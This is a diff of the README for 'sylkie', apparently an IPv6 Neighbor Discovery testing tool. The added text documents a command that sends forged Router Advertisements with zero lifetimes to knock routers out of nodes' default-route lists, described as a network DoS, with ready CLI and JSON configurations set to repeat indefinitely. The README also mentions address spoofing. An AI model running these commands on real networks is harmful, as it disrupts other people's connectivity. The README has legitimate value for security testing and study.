@@ -37,8 +37,8 @@ The following describes the basic usage of `sylkie`. Run `sylkie -h` or
 
 The basic usage of the `sylkie` router advert command is listed below.
 This command will send a Router Advertisement message to the given ip
-or the all nodes multicast addres with the Valid and Preferred
-Lifetime set to 0 for the router ip and prefix provided.
+or the all nodes multicast addres causing the targeted nodes to remove
+`<router-ip>/<prefix>` from their list of default routes.
 
 ```
 sylkie ra -interface <interface> \
@@ -49,12 +49,6 @@ sylkie ra -interface <interface> \
     --repeat <number of times to send the request>
 }
 ```
-
-As you probably notice that is quite a bit of info, that can be annoying
-to type out on the command line. `sylkie` also accepts json to aleviate
-this. Were the subcommand (`ra`, `na`) is a key whos value is an array
-of objects with the keys and values being the corresponding option
-and value. See the examples for details.
 
 #### Router Advert Examples
 
@@ -69,15 +63,26 @@ sylkie ra -i ens3 \
     --timeout 10
 ```
 
-As json this command would be
+This would send a "forged" Router Advertisement to the link local scope
+all-nodes address `ff02::1` causing all of the nodes to remove
+`fe80::b95b:ee1:cafe:9720/64` (link-layer address `52:54:00:e3:f4:06`)
+from their list of default routes.
+
+That is quite a bit of info. To make life easier `sylkie` also accepts
+json, where the subcommand (`ra`, `na`) is a key whos value is an array
+of objects with the keys and values being the corresponding option
+and value. To run the command, pass the path to the json file as the
+argument to the `-j` option.
+
+To run the above command from json, first create a file with the following.
 
 ```
 {
     "ra": [
         {
-            "interface": "br0",
-            "target-mac": "0c:c4:7a:6c:cd:54",
-            "router-ip": "fe80::ec4:7aff:fe6c:cd54",
+            "interface": "ens3",
+            "target-mac": "52:54:00:e3:f4:06",
+            "router-ip": "fe80::b95b:ee1:cafe:9720",
             "prefix": 64,
             "repeat": -1,
             "timeout": 10
@@ -85,6 +90,51 @@ As json this command would be
     ]
 }
 ```
+
+After creating the file, start sending adverts with the following.
+
+```
+sylkie -j /path/to/json
+```
+
+This becomes especially useful if there is a set of advertisements
+that need to be configured and sent. For example, the following json
+config would send two router advertisements on the configured
+intervals.
+
+```
+{
+    "ra": [
+        {
+            "interface": "ens3",
+            "target-mac": "52:54:00:e3:f4:06",
+            "router-ip": "fe80::b95b:ee1:cafe:9720",
+            "prefix": 64,
+            "repeat": -1,
+            "timeout": 10
+        },
+        {
+            "interface": "ens3",
+            "target-mac": "52:54:00:c2:a7:7c",
+            "router-ip": "fe80::cbed:6822:cd23:bbdb",
+            "prefix": 64,
+            "repeat": -1,
+            "timeout": 10
+        }
+    ]
+}
+```
+
+#### How it works
+
+The router advert (`ra`) command attempts to DoS a network by sending
+"forged" Router Advertisement messages to either a targeted address
+(if one is provided) or the link local scope all-nodes address `ff02::1`.
+The "forged" Router Advertisement contains [Prefix Information](https://tools.ietf.org/html/rfc4861#section-4.6.2)
+with the lifetimes set to 0. The message also contains the
+[Source Link-Layer Address](https://tools.ietf.org/html/rfc4861#section-4.6.1).
+This should cause the targeted address or all link local nodes to
+remove the targetted router from the list of default routes.
 
 ### Address spoofing (Neighbor Advert)
 
@@ -98,11 +148,3 @@ sylkie na -i <interface> \
     --timeout <time betweeen adverts> \
     --repeat <number of times to send the request>
 ```
-
-## FAQ
-
-### Why write this?
-
-Learning is fun. I didn't know much about The ND protocol so I read
-[RFC 4861](https://tools.ietf.org/html/rfc4861) and this seemed like
-a good way to learn by practice.
